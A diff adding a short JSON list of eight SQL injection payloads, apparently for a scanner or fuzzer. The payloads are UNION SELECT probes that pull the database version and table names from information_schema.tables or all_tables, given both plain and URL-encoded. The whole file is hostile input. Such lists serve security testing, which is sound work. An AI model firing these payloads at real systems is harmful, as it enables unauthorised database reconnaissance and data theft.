@@ -1,0 +1,11 @@
+[
+    "' union select {@@version}",
+    "%27union+select+{TABLE_NAME}+from+information_schema.tables%23",
+    "%27union+select+{TABLE_NAME}+from+information_schema.tables--",
+    "%27union+SELECT+{TABLE_NAME}+FROM all_tables--",
+    "%27union+select+{@@version}",
+    "' union select {TABLE_NAME} from information_schema.tables#",
+    "' union select {TABLE_NAME} from information_schema.tables-- ",    
+    "' union SELECT {TABLE_NAME} FROM all_tables--"
+]
+
